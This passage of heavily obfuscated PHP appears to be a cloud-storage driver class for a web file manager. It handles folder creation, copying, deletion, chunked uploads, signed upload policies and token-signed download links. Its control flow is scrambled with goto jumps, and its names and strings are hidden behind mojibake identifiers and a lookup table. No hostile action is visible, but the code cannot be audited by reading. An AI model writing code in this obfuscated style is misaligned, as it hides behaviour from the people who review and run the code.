$aÎ·ÀÜîÏ™, $CÊüµáŒ¨¿, $eœæ”÷´˜ö); goto Aï∑∆ Ùêä; Aï∑∆ Ùêä: if (!$døœêöÈ∫Ê) { return array($cë—ÉØßﬂ¢[1094] => !1, $cë—ÉØßﬂ¢[1096] => $cë—ÉØßﬂ¢[1339]); } if (strtolower($cá⁄Öû¿óÛ) == $cë—ÉØßﬂ¢[190] || in_array($døœêöÈ∫Ê[$cë—ÉØßﬂ¢[1094]], array($cë—ÉØßﬂ¢[1197], $cë—ÉØßﬂ¢[1340]))) { $aÎ·ÀÜîÏ™ = $døœêöÈ∫Ê[$cë—ÉØßﬂ¢[1341]]; } else { $aÎ·ÀÜîÏ™ = json_decode($døœêöÈ∫Ê[$cë—ÉØßﬂ¢[1096]], !0); if (!$aÎ·ÀÜîÏ™) { $aÎ·ÀÜîÏ™ = $døœêöÈ∫Ê[$cë—ÉØßﬂ¢[1096]]; } else { if (!$døœêöÈ∫Ê[$cë—ÉØßﬂ¢[729]] && isset($aÎ·ÀÜîÏ™[$cë—ÉØßﬂ¢[1342]])) { $aÎ·ÀÜîÏ™ = $aÎ·ÀÜîÏ™[$cë—ÉØßﬂ¢[1342]]; } } } return array($cë—ÉØßﬂ¢[1094] => $døœêöÈ∫Ê[$cë—ÉØßﬂ¢[729]], $cë—ÉØßﬂ¢[1096] => $aÎ·ÀÜîÏ™); goto e¬‹Öæ°ö˜; e¬‹Öæ°ö˜: } public function mkfile($FÀ∑ºÇà¯…, $D¡ˆ◊¨£Ü¢ = '', $a¨∏ŸÍë≠† = REPEAT_RENAME) { if ($this->setContent($FÀ∑ºÇà¯…, $D¡ˆ◊¨£Ü¢)) { return $this->getPathOuter($FÀ∑ºÇà¯…); } return !1; } public function mkdir($Dÿ§‘∂à≥á, $A¨øå›∏∂√ = REPEAT_SKIP) { $A…ﬂßáÎ∂ =& $_SERVER[™⁄»üÆ]; $EÒÉÇ∆…Õ± = trim($Dÿ§‘∂à≥á, $A…ﬂßáÎ∂[8]); if ($this->_isFolder($EÒÉÇ∆…Õ±)) { return $this->getPathOuter($EÒÉÇ∆…Õ±); } $fçﬁ‚û≤Ùê = array($A…ﬂßáÎ∂[1343]); $f±¡◊≥ãÉ≠ = $this->ussRequest($EÒÉÇ∆…Õ±, $A…ﬂßáÎ∂[224], !1, $fçﬁ‚û≤Ùê); return $f±¡◊≥ãÉ≠[$A…ﬂßáÎ∂[1094]] ? $this->getPathOuter($EÒÉÇ∆…Õ±) : !1; } public function copyFile($bÌ≤Ò“éÔç, $a«©æÏáäﬁ) { $Bê”„Õ˜ƒÜ =& $_SERVER[™⁄»üÆ]; $e◊õô€©‡¢ = array($Bê”„Õ˜ƒÜ[1344] . "\x2f{$this->bucket}\57{$bÌ≤Ò“éÔç}", $Bê”„Õ˜ƒÜ[1345]); $dô›≤üˆ°∑ = $this->ussRequest($a«©æÏáäﬁ, $Bê”„Õ˜ƒÜ[226], !1, $e◊õô€©‡¢); return $dô›≤üˆ°∑[$Bê”„Õ˜ƒÜ[1094]] ? !0 : $this->getPathOuter($a«©æÏáäﬁ); } public function moveFile($FíŒ‹®–Âî, $a≈‡Éãª÷ª) { $d„…–Ãñ´ì =& $_SERVER[™⁄»üÆ]; $f§Œﬂæª¨â = array($d„…–Ãñ´ì[1346] . "\x2f{$this->bucket}\57{$FíŒ‹®–Âî}", $d„…–Ãñ´ì[1345]); $AëëÖìπ§‡ = $this->ussRequest($a≈‡Éãª÷ª, $d„…–Ãñ´ì[226], !1, $f§Œﬂæª¨â); return $AëëÖìπ§‡[$d„…–Ãñ´ì[1094]] ? !0 : $this->getPathOuter($a≈‡Éãª÷ª); } public function delFile($C‘÷≥ß‚û‡) { $bò◊ê¯π”ã =& $_SERVER[™⁄»üÆ]; $E”Æ€¶∏Ò° = $this->ussRequest($C‘÷≥ß‚û‡, $bò◊ê¯π”ã[1347]); return $E”Æ€¶∏Ò°[$bò◊ê¯π”ã[1094]] ? !0 : !1; } public function delFolder($bñÿ¢”∞ôÀ) { goto BØáÓë∑‘; Cüç¬ª”úÇ: foreach ($DÊå¨éÔ€‚ as $BêÓò≤‚ä•) { $c›´ç¯ﬂàâ = $this->ussRequest($BêÓò≤‚ä•[$A≤≠≠ã∑éñ[28]], $A≤≠≠ã∑éñ[1347]); if (!$c›´ç¯ﬂàâ[$A≤≠≠ã∑éñ[1094]]) { return !1; } } foreach ($e ë˘êı¶ß as $Cƒ∆ù¬π–…) { $c›´ç¯ﬂàâ = $this->ussRequest($Cƒ∆ù¬π–…, $A≤≠≠ã∑éñ[1347]); if (!$c›´ç¯ﬂàâ[$A≤≠≠ã∑éñ[1094]]) { return !1; } } $c›´ç¯ﬂàâ = $this->ussRequest($bñÿ¢”∞ôÀ, $A≤≠≠ã∑éñ[1347]); goto B¨¶à±ˆæı; añæªà©ºû: $e ë˘êı¶ß = $DÊå¨éÔ€‚ = array(); $this->fileList($bñÿ¢”∞ôÀ, $e ë˘êı¶ß, $DÊå¨éÔ€‚, !0); $this->listItemCache = !0; goto Cüç¬ª”úÇ; B¨¶à±ˆæı: return $c›´ç¯ﬂàâ[$A≤≠≠ã∑éñ[1094]]; goto Då›º·µ¢≤; BØáÓë∑‘: $A≤≠≠ã∑éñ =& $_SERVER[™⁄»üÆ]; if (!$this->exist($bñÿ¢”∞ôÀ)) { return !0; } $this->listItemCache = !1; goto añæªà©ºû; Då›º·µ¢≤: } public function rename($BÙˆÁË≠øì, $B‡‘¢Üö†≈) { if ($this->isFile($BÙˆÁË≠øì)) { $B‡‘¢Üö†≈ = get_path_father($BÙˆÁË≠øì) . $B‡‘¢Üö†≈; return $this->moveFile($BÙˆÁË≠øì, $B‡‘¢Üö†≈); } return $this->renameObject($BÙˆÁË≠øì, $B‡‘¢Üö†≈); } public function fileInfo($a˜áõ™ªâè, $Bøë‹äÿÜÏ = false, $fü∆„≤ŸœÎ = array()) { goto bÚˆ±…ñÎú; aïÿªπâ«‡: $F¶≈¶”È…◊[$c™ã¥ûÖ€·[194]] = intval($fü∆„≤ŸœÎ[$c™ã¥ûÖ€·[1348]]); $F¶≈¶”È…◊[$c™ã¥ûÖ€·[84]] = intval($fü∆„≤ŸœÎ[$c™ã¥ûÖ€·[1349]]); $F¶≈¶”È…◊[$c™ã¥ûÖ€·[78]] = $fü∆„≤ŸœÎ[$c™ã¥ûÖ€·[78]]; goto b≤À◊ıœçÚ; E∏◊∫≤îÜÑ: $F¶≈¶”È…◊[$c™ã¥ûÖ€·[194]] = $F¶≈¶”È…◊[$c™ã¥ûÖ€·[84]] = 0; $F¶≈¶”È…◊[$c™ã¥ûÖ€·[195]] = $F¶≈¶”È…◊[$c™ã¥ûÖ€·[196]] = !0; if (empty($fü∆„≤ŸœÎ)) { $fü∆„≤ŸœÎ = $this->objectMeta($a˜áõ™ªâè); if (!$fü∆„≤ŸœÎ) { return $F¶≈¶”È…◊; } } goto aïÿªπâ«‡; bÚˆ±…ñÎú: $c™ã¥ûÖ€· =& $_SERVER[™⁄»üÆ]; $F¶≈¶”È…◊ = array($c™ã¥ûÖ€·[28] => $this->pathThis($a˜áõ™ªâè), $c™ã¥ûÖ€·[76] => $this->getPathOuter($c™ã¥ûÖ€·[8] . $a˜áõ™ªâè), $c™ã¥ûÖ€·[29] => $c™ã¥ûÖ€·[193], $c™ã¥ûÖ€·[78] => isset($fü∆„≤ŸœÎ[$c™ã¥ûÖ€·[78]]) ? $fü∆„≤ŸœÎ[$c™ã¥ûÖ€·[78]] : 0, $c™ã¥ûÖ€·[168] => $this->ext($a˜áõ™ªâè)); if ($Bøë‹äÿÜÏ) { return $F¶≈¶”È…◊; } goto E∏◊∫≤îÜÑ; b≤À◊ıœçÚ: return $F¶≈¶”È…◊; goto e‡”Ù¢∞å´; e‡”Ù¢∞å´: } public function folderInfo($bŸ∂Éƒ»îà, $C√•»ï”Ëü = false) { goto fªçÈõùÇÀ; fªçÈõùÇÀ: $FúÚÜçßÃè =& $_SERVER[™⁄»üÆ]; $B†êÀ§ÂßÔ = array($FúÚÜçßÃè[28] => $this->pathThis($bŸ∂Éƒ»îà), $FúÚÜçßÃè[76] => $this->getPathOuter($FúÚÜçßÃè[8] . $bŸ∂Éƒ»îà), $FúÚÜçßÃè[29] => $FúÚÜçßÃè[77]); if ($C√•»ï”Ëü) { return $B†êÀ§ÂßÔ; } goto FàÆ∏øº¶Á; FàÆ∏øº¶Á: $B†êÀ§ÂßÔ[$FúÚÜçßÃè[194]] = $B†êÀ§ÂßÔ[$FúÚÜçßÃè[84]] = 0; $B†êÀ§ÂßÔ[$FúÚÜçßÃè[195]] = $B†êÀ§ÂßÔ[$FúÚÜçßÃè[196]] = !0; if (empty($còÏÉÓû◊Á)) { $còÏÉÓû◊Á = $this->objectMeta($bŸ∂Éƒ»îà); if (!$còÏÉÓû◊Á) { return $B†êÀ§ÂßÔ; } } goto bÀÖ≈÷ëÑà; bÀÖ≈÷ëÑà: $B†êÀ§ÂßÔ[$FúÚÜçßÃè[194]] = intval($còÏÉÓû◊Á[$FúÚÜçßÃè[1348]]); $B†êÀ§ÂßÔ[$FúÚÜçßÃè[84]] = intval($còÏÉÓû◊Á[$FúÚÜçßÃè[1349]]); return $B†êÀ§ÂßÔ; goto EßÎ›ªΩ†é; EßÎ›ªΩ†é: } private function listObjs($f´˘Íà©Ï⁄, $EÉ†€∆úÏç = 0, $B≤ÿÓåõëÜ = 1000) { $e˜æ§à≤«¡ =& $_SERVER[™⁄»üÆ]; $c¬ëÃûıÚ’ = array($e˜æ§à≤«¡[1350], $e˜æ§à≤«¡[1351] . $B≤ÿÓåõëÜ); if ($EÉ†€∆úÏç) { $c¬ëÃûıÚ’[] = $e˜æ§à≤«¡[1352] . $EÉ†€∆úÏç; } $b£óäÛÿÒ = $this->ussRequest($f´˘Íà©Ï⁄, $e˜æ§à≤«¡[228], !1, $c¬ëÃûıÚ’); return !$b£óäÛÿÒ[$e˜æ§à≤«¡[1094]] ? !1 : $b£óäÛÿÒ[$e˜æ§à≤«¡[1096]]; } private function fileList($Cﬂü¡È´√≥, &$DÙ™¶Ãÿ⁄◊, &$Büâ≤¬∂ÿé, $bï”ª∑ˆé® = false) { goto Dê∫äõ¥‹‡; bΩﬂü Î“∏: if ($d¥ﬁŸ‚ü⁄Ç) { $this->cacheMethod($b÷±ñÌ‹âã[199], $Cﬂü¡È´√≥, !0); } goto F≈íô§éë»; dï¯ƒÆ”à◊: $B¡íÁñ∂âñ = rtrim($Cﬂü¡È´√≥, $b÷±ñÌ‹âã[8]) . $b÷±ñÌ‹âã[8]; $d¥ﬁŸ‚ü⁄Ç = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $C±ÜñÆÑÕÈ = $this->listObjs($Cﬂü¡È´√≥, $c∂¡™∂ºäç, $b ∞Íü¡Æ±); if (!$C±ÜñÆÑÕÈ) { return !1; } $c∂¡™∂ºäç = isset($C±ÜñÆÑÕÈ[$b÷±ñÌ‹âã[1353]]) ? $C±ÜñÆÑÕÈ[$b÷±ñÌ‹âã[1353]] : $b÷±ñÌ‹âã[33]; $B›úØ¥Øêç = isset($C±ÜñÆÑÕÈ[$b÷±ñÌ‹âã[1354]]) ? $C±ÜñÆÑÕÈ[$b÷±ñÌ‹âã[1354]] : array(); foreach ($B›úØ¥Øêç as $b∂¥áü˜ôƒ) { $F»Ë´ã‚˜Õ = $b∂¥áü˜ôƒ[$b÷±ñÌ‹âã[29]] == $b÷±ñÌ‹âã[77] ? !0 : !1; $bê÷ÁñÊÊÒ = ltrim($B¡íÁñ∂âñ . $b∂¥áü˜ôƒ[$b÷±ñÌ‹âã[28]], $b÷±ñÌ‹âã[8]) . ($F»Ë´ã‚˜Õ ? $b÷±ñÌ‹âã[8] : $b÷±ñÌ‹âã[33]); $f™¬¯üÖ…É = array($b÷±ñÌ‹âã[28] => $bê÷ÁñÊÊÒ, $b÷±ñÌ‹âã[29] => $F»Ë´ã‚˜Õ ? $b÷±ñÌ‹âã[77] : $b÷±ñÌ‹âã[193], $b÷±ñÌ‹âã[78] => $b∂¥áü˜ôƒ[$b÷±ñÌ‹âã[335]], $b÷±ñÌ‹âã[1349] => $b∂¥áü˜ôƒ[$b÷±ñÌ‹âã[1355]]); if ($d¥ﬁŸ‚ü⁄Ç) { $this->cacheMethod($b÷±ñÌ‹âã[199], $bê÷ÁñÊÊÒ, $F»Ë´ã‚˜Õ); $this->cacheMethod($b÷±ñÌ‹âã[200], $bê÷ÁñÊÊÒ, $f™¬¯üÖ…É); } if ($F»Ë´ã‚˜Õ) { $DÙ™¶Ãÿ⁄◊[] = $bê÷ÁñÊÊÒ; if ($bï”ª∑ˆé®) { $this->fileList($bê÷ÁñÊÊÒ, $DÙ™¶Ãÿ⁄◊, $Büâ≤¬∂ÿé, $bï”ª∑ˆé®); } continue; } $Büâ≤¬∂ÿé[] = $f™¬¯üÖ…É; } if (count($B›úØ¥Øêç) < $b ∞Íü¡Æ±) { break; } } goto bΩﬂü Î“∏; Dê∫äõ¥‹‡: $b÷±ñÌ‹âã =& $_SERVER[™⁄»üÆ]; $c∂¡™∂ºäç = $b÷±ñÌ‹âã[33]; $b ∞Íü¡Æ± = 1000; goto dï¯ƒÆ”à◊; F≈íô§éë»: } public function listPath($E ˘∂¬ïﬁÉ, $C¯¥Ñ¶ÔÇª = false) { $FïÕ©ã¶Ã∫ =& $_SERVER[™⁄»üÆ]; $câ¡àø›Àä = $Fµ±äﬁ≠è≤ = array(); $this->fileList($E ˘∂¬ïﬁÉ, $câ¡àø›Àä, $Fµ±äﬁ≠è≤); foreach ($câ¡àø›Àä as $b¶Ç•ü—®≠ => $Föä∑ÔÉ®ç) { $câ¡àø›Àä[$b¶Ç•ü—®≠] = $this->folderInfo($Föä∑ÔÉ®ç, $C¯¥Ñ¶ÔÇª); } foreach ($Fµ±äﬁ≠è≤ as $b¶Ç•ü—®≠ => $Föä∑ÔÉ®ç) { $Fµ±äﬁ≠è≤[$b¶Ç•ü—®≠] = $this->fileInfo($Föä∑ÔÉ®ç[$FïÕ©ã¶Ã∫[28]], $C¯¥Ñ¶ÔÇª, $Föä∑ÔÉ®ç); } return array($FïÕ©ã¶Ã∫[75] => $câ¡àø›Àä, $FïÕ©ã¶Ã∫[74] => $Fµ±äﬁ≠è≤); } public function has($f˜≥ÂÇæâ¿, $CÜüÊ∑Ë”≥ = false, $E…ıóîé± = true) { goto bê„Ï—§üÉ; F€‰Àèøª◊: while (!0) { check_abort(); $eˆê¿πÖ¨ = $this->listObjs($f˜≥ÂÇæâ¿, $FêíÛ ∂÷◊, $BŒëÖΩ‡òí); if (!$eˆê¿πÖ¨) { return !1; } $FêíÛ ∂÷◊ = isset($eˆê¿πÖ¨[$bçÛﬂ∏≈ç√[1353]]) ? $eˆê¿πÖ¨[$bçÛﬂ∏≈ç√[1353]] : $bçÛﬂ∏≈ç√[33]; $d˜¨ïóÊÍ = isset($eˆê¿πÖ¨[$bçÛﬂ∏≈ç√[1354]]) ? $eˆê¿πÖ¨[$bçÛﬂ∏≈ç√[1354]] : array(); if (empty($d˜¨ïóÊÍ)) { break; } $FÉŒ„Ù™É€ = array_filter($d˜¨ïóÊÍ, function ($BÀ•Ñ¶åßÃ) { $BØÚ‹ŸÁ™π =& $_SERVER[™⁄»üÆ]; return $BÀ•Ñ¶åßÃ[$BØÚ‹ŸÁ™π[29]] == $BØÚ‹ŸÁ™π[77]; }); $FŒßÈ’®ö• = count($d˜¨ïóÊÍ); $FÉŒ„Ù™É€ = count($FÉŒ„Ù™É€); $dìÂ„¡Î≥√ = $FŒßÈ’®ö• - $FÉŒ„Ù™É€; if ($CÜüÊ∑Ë”≥) { $DÉ„∏èˆ‡Ê += $FÉŒ„Ù™É€; $f’‚ëÚ’áç += $dìÂ„¡Î≥√; if ($FŒßÈ’®ö• < $BŒëÖΩ‡òí) { break; } continue; } if ($E…ıóîé±) { if ($dìÂ„¡Î≥√) { return !0; } } else { if ($FÉŒ„Ù™É€) { return !0; } } if ($FŒßÈ’®ö• < $BŒëÖΩ‡òí) { break; } } if ($CÜüÊ∑Ë”≥) { return array($bçÛﬂ∏≈ç√[203] => $f’‚ëÚ’áç, $bçÛﬂ∏≈ç√[204] => $DÉ„∏èˆ‡Ê); } return !1; goto Eıäáª‚åˆ; bê„Ï—§üÉ: $bçÛﬂ∏≈ç√ =& $_SERVER[™⁄»üÆ]; $FêíÛ ∂÷◊ = $bçÛﬂ∏≈ç√[33]; $BŒëÖΩ‡òí = 500; goto F¶Áí§ÊÑ ; F¶Áí§ÊÑ : $f’‚ëÚ’áç = 0; $DÉ„∏èˆ‡Ê = 0; $bä€ıòÇ≥¢ = rtrim($f˜≥ÂÇæâ¿, $bçÛﬂ∏≈ç√[8]) . $bçÛﬂ∏≈ç√[8]; goto F€‰Àèøª◊; Eıäáª‚åˆ: } public function listAll($DﬁÜòÕƒÔº) { goto b≈öî™–õõ; F„ì‹⁄ú¿ß: $eªë∞Öµä = array(); foreach ($BîèÇåßùÕ as $dÛØ√î†àØ) { $eªë∞Öµä[$dÛØ√î†àØ[$fﬁ¡˘üÒÔ‹[28]]] = $dÛØ√î†àØ[$fﬁ¡˘üÒÔ‹[78]]; } foreach ($DçÑÉâ‘ñÊ as $dÛØ√î†àØ) { if (is_string($dÛØ√î†àØ)) { $eªë∞Öµä[$dÛØ√î†àØ] = 0; } } goto Eﬁ‘ó‚úÛÜ; b≈öî™–õõ: $fﬁ¡˘üÒÔ‹ =& $_SERVER[™⁄»üÆ]; $DçÑÉâ‘ñÊ = $BîèÇåßùÕ = array(); $this->fileList($DﬁÜòÕƒÔº, $DçÑÉâ‘ñÊ, $BîèÇåßùÕ, !0); goto F„ì‹⁄ú¿ß; Eﬁ‘ó‚úÛÜ: return $this->listAllFiles($DﬁÜòÕƒÔº, array_keys($eªë∞Öµä), $eªë∞Öµä); goto EÓ„¥…èë—; EÓ„¥…èë—: } public function canRead($aÈ≈ÔÉ¶‘Á) { return $this->exist($aÈ≈ÔÉ¶‘Á) ? !0 : !1; } public function canWrite($aÁÚñåÜ•Ï) { return $this->exist($aÁÚñåÜ•Ï) ? !0 : !1; } public function getContent($D‡õ◊ç§≈ê) { return $this->fileSubstr($D‡õ◊ç§≈ê, 0, -1); } public function setContent($B∏∂∏ÂÜÂ◊, $Bºª‚“Ì°˜ = '') { $C”ÓÌŒÙƒ =& $_SERVER[™⁄»üÆ]; if (!$Bºª‚“Ì°˜) { $b·ìî∞à∏ì = $this->ussRequest($B∏∂∏ÂÜÂ◊, $C”ÓÌŒÙƒ[224]); return $b·ìî∞à∏ì[$C”ÓÌŒÙƒ[1094]]; } $b¡êù¬ì–• = $this->tempFile($this->pathThis($B∏∂∏ÂÜÂ◊)); file_put_contents($b¡êù¬ì–•, $Bºª‚“Ì°˜); if ($this->upload($B∏∂∏ÂÜÂ◊, $b¡êù¬ì–•)) { $this->tempFileRemve($b¡êù¬ì–•); return !0; } return !1; } public function fileSubstr($eß≥√”·ç”, $dàÉÉÊûÕ, $FÛÜíªëôí) { $A‹çµ‡î„ù =& $_SERVER[™⁄»üÆ]; if (!($cÆâäÈµÓ∂ = $this->link($eß≥√”·ç”))) { return !1; } $e—Íîı¥ÆÊ = !1; if ($FÛÜíªëôí > 0) { $d⁄àÒ»¨Çπ = $dàÉÉÊûÕ + $FÛÜíªëôí - 1; $e—Íîı¥ÆÊ = array($A‹çµ‡î„ù[1316] . $dàÉÉÊûÕ . $A‹çµ‡î„ù[441] . $d⁄àÒ»¨Çπ); } $bπí™°¿√Ï = url_request($cÆâäÈµÓ∂, $A‹çµ‡î„ù[228], !1, $e—Íîı¥ÆÊ); return $bπí™°¿√Ï[$A‹çµ‡î„ù[729]] ? $bπí™°¿√Ï[$A‹çµ‡î„ù[1096]] : !1; } public function upload($E‚€Úìé˜É, $e‹œÃ§çÉ≠, $B∫Ü©´Îﬁò = false, $aÌçµ´†Ãâ = REPEAT_REPLACE) { goto EÑ£åÉ·ëƒ; EÑ£åÉ·ëƒ: $C¨àÀ≤Ë’∫ =& $_SERVER[™⁄»üÆ]; $EóÉ∏ùÛ›ó = IO::size($e‹œÃ§çÉ≠); if ($EóÉ∏ùÛ›ó <= 1024 * 1024 * 200) { $cä≥Á÷≈◊◊ = array($C¨àÀ≤Ë’∫[1356] . $e‹œÃ§çÉ≠); $bîÿïˆ“Ò– = $this->ussRequest($E‚€Úìé˜É, $C¨àÀ≤Ë’∫[226], $cä≥Á÷≈◊◊); return $bîÿïˆ“Ò–[$C¨àÀ≤Ë’∫[1094]] ? $this->getPathOuter($E‚€Úìé˜É) : !1; } goto DÀ÷ßª—ÆÓ; BûÛ¯§ˆÙ‡: $bîÿïˆ“Ò– = $this->ussRequest($E‚€Úìé˜É, $C¨àÀ≤Ë’∫[226], !1, $eòèààÛÙù); return $bîÿïˆ“Ò–[$C¨àÀ≤Ë’∫[1094]] ? $this->getPathOuter($Fœ“…Ãöõ≥) : !1; goto dèúñÿ·«Ÿ; cﬂù´ÑÈŒ˘: if (!$bîÿïˆ“Ò–[$C¨àÀ≤Ë’∫[1094]]) { return !1; } $F≤éê ‘‚· = $bîÿïˆ“Ò–[$C¨àÀ≤Ë’∫[1096]]; $BÁ„å¬ß∫´ = 0; goto F˘Ç∏Ôéã˜; F˘Ç∏Ôéã˜: $dá•â¨ºß“ = $F≤éê ‘‚·[$C¨àÀ≤Ë’∫[1361]]; $E’ÑÑ√˜…â = fopen($e‹œÃ§çÉ≠, $C¨àÀ≤Ë’∫[1267]); if (!$E’ÑÑ√˜…â) { return !1; } goto Bî“ıÃ¶õ„; DÀ÷ßª—ÆÓ: $B¿¡¿„µ§Ø = 1024 * 1024 * 10; $eòèààÛÙù = array($C¨àÀ≤Ë’∫[1357], $C¨àÀ≤Ë’∫[1358] . $EóÉ∏ùÛ›ó, $C¨àÀ≤Ë’∫[1359], $C¨àÀ≤Ë’∫[1360] . $B¿¡¿„µ§Ø); $bîÿïˆ“Ò– = $this->ussRequest($E‚€Úìé˜É, $C¨àÀ≤Ë’∫[226], !1, $eòèààÛÙù); goto cﬂù´ÑÈŒ˘; Bî“ıÃ¶õ„: do { $a∑’—àÇë© = $F≤éê ‘‚·[$C¨àÀ≤Ë’∫[1362]]; fseek_64($E’ÑÑ√˜…â, $BÁ„å¬ß∫´); $aø∞ïÙ˜°¡ = fread($E’ÑÑ√˜…â, $a∑’—àÇë©); $fì∫õ•’ûê = 0; do { $fì∫õ•’ûê++; $F≤éê ‘‚· = $this->uploadPart($E‚€Úìé˜É, $F≤éê ‘‚·, $aø∞ïÙ˜°¡); } while (!$F≤éê ‘‚· && $fì∫õ•’ûê < 3); if (!$F≤éê ‘‚·) { return !1; } $dá•â¨ºß“ = $F≤éê ‘‚·[$C¨àÀ≤Ë’∫[1361]]; $BÁ„å¬ß∫´ += $a∑’—àÇë©; } while ($dá•â¨ºß“ != -1); fclose($E’ÑÑ√˜…â); $eòèààÛÙù = array($C¨àÀ≤Ë’∫[1363], $C¨àÀ≤Ë’∫[1364] . $F≤éê ‘‚·[$C¨àÀ≤Ë’∫[1365]], $C¨àÀ≤Ë’∫[1359]); goto BûÛ¯§ˆÙ‡; dèúñÿ·«Ÿ: } private function uploadPart($e›€¶‚ÿ≥≠, $EêÇﬂåÛ≈ì, &$EÇã¶¬‹ùù) { $Eèá¥©–Îù =& $_SERVER[™⁄»üÆ]; $dÈáîõ—ËÇ = array($Eèá¥©–Îù[1366], $Eèá¥©–Îù[1364] . $EêÇﬂåÛ≈ì[$Eèá¥©–Îù[1365]], $Eèá¥©–Îù[1367] . $EêÇﬂåÛ≈ì[$Eèá¥©–Îù[1361]], $Eèá¥©–Îù[141] . $EêÇﬂåÛ≈ì[$Eèá¥©–Îù[1362]]); $a‡›Û≤–ıø = $this->ussRequest($e›€¶‚ÿ≥≠, $Eèá¥©–Îù[226], $EÇã¶¬‹ùù, $dÈáîõ—ËÇ); return !$a‡›Û≤–ıø[$Eèá¥©–Îù[1094]] ? $a‡›Û≤–ıø[$Eèá¥©–Îù[1094]] : $a‡›Û≤–ıø[$Eèá¥©–Îù[1096]]; } public function uploadFormData($d«êåç∂¢∑, $cö’πç≈Ê˘ = 3600) { return $this->uploadPolicy($d«êåç∂¢∑, $cö’πç≈Ê˘); } public function multiUploadFormData($Cççÿ¢ÌÖ¨, $Fê»ƒ∫Ë◊ô = 3600) { $d‹÷„ıÆÂ° =& $_SERVER[™⁄»üÆ]; $D∏«‰„∑Àﬂ = (int) $GLOBALS[$d‹÷„ıÆÂ°[7]][$d‹÷„ıÆÂ°[78]]; return $this->uploadPolicy($Cççÿ¢ÌÖ¨, $Fê»ƒ∫Ë◊ô, $D∏«‰„∑Àﬂ); } private function uploadPolicy($E∞∞ä‰‹ô•, $Cöãπâ∂äà = 3600, $c‘π∫ß»Ú± = 0) { goto aŒ¡Ñê´ßú; EÖ›Û∏ªŸø: $bï·Ù£Ÿ’‹ = array($Dÿë°ãâ…î[1368] => $this->bucket, $Dÿë°ãâ…î[1369] => $E∞∞ä‰‹ô•, $Dÿë°ãâ…î[1370] => time() + $Cöãπâ∂äà, $Dÿë°ãâ…î[1371] => $fÈ‡ÆÔÇ©‘); if ($c‘π∫ß»Ú±) { $bï·Ù£Ÿ’‹[$Dÿë°ãâ…î[1283]] = $c‘π∫ß»Ú±; } $e“õÉÙ≥–Ó = base64_encode(json_encode($bï·Ù£Ÿ’‹)); goto BÏî›ÕÁÇ‰; aŒ¡Ñê´ßú: $Dÿë°ãâ…î =& $_SERVER[™⁄»üÆ]; $c€¥óÍ¨ÙŸ = $Dÿë°ãâ…î[8] . $this->bucket; $fÈ‡ÆÔÇ©‘ = gmdate($Dÿë°ãâ…î[1303]); goto EÖ›Û∏ªŸø; BÏî›ÕÁÇ‰: $BÆè≠±Ò’ú = base64_encode(hash_hmac($Dÿë°ãâ…î[1338], "\x50\117\x53\x54\46{$c€¥óÍ¨ÙŸ}\x26{$fÈ‡ÆÔÇ©‘}\46{$e“õÉÙ≥–Ó}", md5("{$this->userpass}"), !0)); $C£‹˜ØÎâõ = array($Dÿë°ãâ…î[1209] => $e“õÉÙ≥–Ó, $Dÿë°ãâ…î[1372] => "\125\120\x59\125\116\x20{$this->username}\72{$BÆè≠±Ò’ú}", $Dÿë°ãâ…î[175] => $this->endpoint . $c€¥óÍ¨ÙŸ); return $C£‹˜ØÎâõ; goto F£Ëå¶ïÿ©; F£Ëå¶ïÿ©: } public function download($dóŸ∫”Ê“í, $CÁøõ≠ô∏) { goto A¡µœ‘õ€’; B‘—éåç“◊: $cƒﬂ¨íá±ø = 1024 * 200; $a£Ó±•Ÿ≠∏ = fopen($f¶Îêßí◊∞, $_SERVER[™⁄»üÆ][1322]); while (!0) { $fâçﬁÃ∑úı = $this->fileSubstr($dóŸ∫”Ê“í, $bêﬂ¥ÖÿÔç, $cƒﬂ¨íá±ø); if ($fâçﬁÃ∑úı === !1) { return !1; } fwrite($a£Ó±•Ÿ≠∏, $fâçﬁÃ∑úı); $bêﬂ¥ÖÿÔç += $cƒﬂ¨íá±ø; if (strlen($fâçﬁÃ∑úı) < $cƒﬂ¨íá±ø) { break; } } goto B∆£Õ•Ò›Ì; B∆£Õ•Ò›Ì: fclose($a£Ó±•Ÿ≠∏); return $CÁøõ≠ô∏; goto e“é´ÿ§“ı; A¡µœ‘õ€’: $f¶Îêßí◊∞ = IO::getPathInner(IO::mkfile($CÁøõ≠ô∏)); if (!($B∏ÓË–ÓŸ€ = $this->link($dóŸ∫”Ê“í))) { return !1; } $bêﬂ¥ÖÿÔç = 0; goto B‘—éåç“◊; e“é´ÿ§“ı: } public function link($BÛ™·ÆëóÒ, $eö„óÕ“…◊ = array()) { $B—Ëﬂ›ü†í =& $_SERVER[™⁄»üÆ]; $BÛ™·ÆëóÒ = trim($BÛ™·ÆëóÒ, $B—Ëﬂ›ü†í[8]); if (!empty($this->token)) { $fÛÎ≠∆—∏˜ = strtotime(date($B—Ëﬂ›ü†í[1373])); $C∫ä€∏äå¡ = substr(md5($this->token . $B—Ëﬂ›ü†í[282] . $fÛÎ≠∆—∏˜ . $B—Ëﬂ›ü†í[1374] . $BÛ™·ÆëóÒ), 12, 8) . $fÛÎ≠∆—∏˜; $eö„óÕ“…◊[] = $B—Ëﬂ›ü†í[1375] . $C∫ä€∏äå¡; } $d äû·è™´ = !empty($eö„óÕ“…◊) ? $B—Ëﬂ›ü†í[70] . implode($B—Ëﬂ›ü†í[282], $eö„óÕ“…◊) : $B—Ëﬂ›ü†í[33]; return $this->getHost() . $B—Ëﬂ›ü†í[8] . $BÛ™·ÆëóÒ . $d äû·è™´; } public function fileOut($Eµÿ‘¯áœ¬, $fÛ∂ËÛÓÂ‹ = false, $c°ΩÒŒ∏◊¨ = false, $C∆ä§£˜ÎÛ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Eµÿ‘¯áœ¬, $fÛ∂ËÛÓÂ‹, $c°ΩÒŒ∏◊¨, $C∆ä§£˜ÎÛ); } if (!$c°ΩÒŒ∏◊¨) { $c°ΩÒŒ∏◊¨ = $this->pathThis($Eµÿ‘¯áœ¬); } $DΩÍ√µ∏úã = $fÛ∂ËÛÓÂ‹ ? array($_SERVER[™⁄»üÆ][1376] . rawurlencode($c°ΩÒŒ∏◊¨)) : array(); $CÜå∆≤íÀÑ = $this->link($Eµÿ‘¯áœ¬, $DΩÍ√µ∏úã); $this->fileOutLink($CÜå∆≤íÀÑ); } public function fileOutServer($b∞›ÜÃ£Ìº, $E⁄Õâ∂¡ò∫ = false, $c…˘øãıëŒ = false, $EËªÇÖı™Ù = '') { parent::fileOut($b∞›ÜÃ£Ìº, $E⁄Õâ∂¡ò∫, 